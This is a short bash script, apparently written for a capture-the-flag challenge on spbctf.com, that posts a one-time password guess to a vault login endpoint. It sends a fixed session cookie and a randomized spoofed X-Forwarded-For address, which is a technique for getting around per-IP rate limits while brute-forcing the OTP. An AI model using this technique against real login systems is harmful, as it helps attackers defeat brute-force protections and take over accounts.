#!/bin/bash

curl -v -L 'http://84.201.129.183/room/lecture/' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'sec-ch-ua: "Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "macOS"' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Origin: https://hli-vault.spbctf.com' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Referer: https://hli-vault.spbctf.com/' \
  -H "X-Forwarded-For: 172.20.$((1 + $RANDOM % 200)).$((1 + $RANDOM % 200))" \
  -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,ru;q=0.7' \
  -H 'Cookie: _vault_session=9228a16e3101822bf8c1d88c296b4947' \
  --data-raw "otp=$1" 
